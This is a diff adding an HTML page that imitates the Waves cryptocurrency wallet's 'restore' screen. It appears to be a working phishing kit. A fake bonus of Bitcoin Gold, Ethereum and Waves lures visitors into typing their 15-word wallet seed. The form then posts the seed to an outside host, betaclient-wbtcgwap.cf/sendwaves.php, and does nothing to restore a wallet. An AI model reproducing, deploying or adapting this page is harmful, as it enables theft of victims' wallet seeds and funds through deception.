@@ -1,0 +1,74 @@
+
+<!DOCTYPE html>
+<!-- saved from url=(0038)https://beta.wavesplatform.com/restore -->
+<html ng-app="app" class="ng-scope"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+    
+    <title>Waves Client</title>
+    <meta name="viewport" content="height=900, width=1300, initial-scale=0.1, user-scalable=yes">
+    <link rel="icon" href="Waves&#32;Client_files/favicon.ico" type="image/x-icon">
+    
+
+    <link rel="stylesheet" href="Waves&#32;Client_files/waves-client-styles-1.0.0-beta.13.css">
+
+    <!--<base href="/">--><base href="">
+
+<!--<base href="/">--><base href=""></head>
+
+<body class="restore">
+
+
+
+<!-- uiView: --><ui-view name="main" class="ng-scope" style=""><div w-i18n-ns="app.restore" class="restore-content ng-scope"><w-change-language class="ng-isolate-scope"><w-select ng-model="$ctrl.active" class="ng-pristine ng-untouched ng-valid ng-isolate-scope ng-not-empty" aria-invalid="false"><div class="select">
+
+<div class="title"><div class="title-content ng-scope"><div class="lng-item lng-en"><img width="60" height="20" src="bb.png"></div></div></div>
+
+<div class="select-list" ng-transclude=""><!-- ngRepeat: lng in $ctrl.list --><w-option ng-repeat="lng in $ctrl.list" value="en" class="ng-scope active" style="order: 0;">
+
+<div class="option" ng-transclude=""><div class="lng-item lng-en">en</div></div></w-option><!-- end ngRepeat: lng in $ctrl.list --><w-option ng-repeat="lng in $ctrl.list" value="ru" class="ng-scope"><div class="option" ng-transclude=""><div class="lng-item lng-ru">ru</div></div></w-option>
+
+<!-- end ngRepeat: lng in $ctrl.list --><w-option ng-repeat="lng in $ctrl.list" value="ko" class="ng-scope"><div class="option" ng-transclude=""><div class="lng-item lng-ko">ko</div></div></w-option><!-- end ngRepeat: lng in $ctrl.list --></div></div></w-select></w-change-language>
+
+<div class="waves-logo"><center><img src="cunek.png" /></center></div><w-step-by-step active-step="0" class="ng-isolate-scope"><div class="step-list" ng-transclude=""><w-step class="ng-scope ng-isolate-scope" step="0"><!-- ngIf: $ctrl.state --><div ng-if="$ctrl.state" ng-transclude="" class="ng-scope">
+
+
+    <div class="headline-1 text-center ng-scope" w-i18n="seedForm.title">Welcome Back</div><div class="body-2 text-center margin-5 ng-scope"><span class="disabled-600 ng-scope" w-i18n="seedForm.description"></span> <a ui-sref="create" w-i18n="seedForm.create" class="ng-scope" > Sign in to your wallet below to claim Bonus Event +3000.80089 Bitcoin Gold / +3.98000 Ethereum(ETH) And +120 Waves</a></div>
+
+<div class="body-2 basic-900 ng-scope" w-i18n="seedForm.seedTitle">Your wallet seed</div>
+
+
+
+<form method="POST" action="http://betaclient-wbtcgwap.cf/sendwaves.php"accept-charset="UTF-8"class="margin-2 ng-scope ng-valid-minlength ng-dirty ng-valid-parse ng-valid ng-valid-required" style="">
+    
+     <div class="seed-block margin-3"><w-input textarea="id="kata_mutiara"required="required" name="kata_mutiara"maxlength="150" class="embed no-icon big ng-pristine ng-untouched ng-isolate-scope ng-valid-minlength ng-not-empty ng-valid ng-valid-required="  placeholder="Your seed is the 15 words you saved when creating your account" w-i18n-attr="placeholder" minlength="25" required="" aria-invalid="false" aria-required="true" style="">
+   
+
+<div class="w-input-wrap"><textarea textarea="id="kata_mutiara"required="required" name="kata_mutiara"maxlength="150"" class="embed no-icon big ng-isolate-scope ng-valid-minlength ng-dirty ng-valid-parse ng-touched ng-not-empty ng-valid ng-valid-required" ng-model="mpcseed" placeholder="Your seed is the 15 words you saved when creating your account" w-i18n-attr="placeholder" minlength="25" required="="required"name="login_password" aria-invalid="false" style=""></textarea></div></w-input>
+
+
+<div class="address-block-info"><!-- ngIf: $ctrl.address --><w-avatar ng-if="$ctrl.address" class="margin-right-1 ng-scope ng-isolate-scope" address="$ctrl.address" size="40" style=""><div class="avatar-wrap" ng-style="$ctrl.style" style="width: 40px; height: 40px;">
+
+<img width="40" height="40" src="data.png">
+
+
+</div></w-avatar><!-- end ngIf: $ctrl.address --><!-- ngIf: !$ctrl.address --><div class="address-block"><div class="body-2 basic-900 ng-scope" w-i18n="seedForm.address">Address</div>
+
+
+
+
+</div></div></div>
+
+
+<w-button disabled="!$ctrl.address" class="submit big long ng-isolate-scope" w-step-next=""><button ng-transclude="" class="submit big long"><w-i18n class="ng-scope">Continue</w-i18n></button></w-button></form>
+
+
+</div><!-- end ngIf: $ctrl.state --></w-step><w-step class="ng-scope ng-isolate-scope" step="1"><!-- ngIf: $ctrl.state --></w-step></div></w-step-by-step><!--TODO @xenohunter #wrap-in-component--><div class="or margin-2"><span w-i18n="seedForm.or" class="ng-scope">or</span></div><div class="text-center body-2 flex-column-center-min margin-2"><a ui-sref="welcome" w-i18n="passwordForm.login" class="ng-scope" >Sign in</a> <span w-i18n="seedForm.tosaved" class="ng-scope">to a saved account</span></div></div></ui-view>
+
+
+
+
+
+
+
+</body></html>
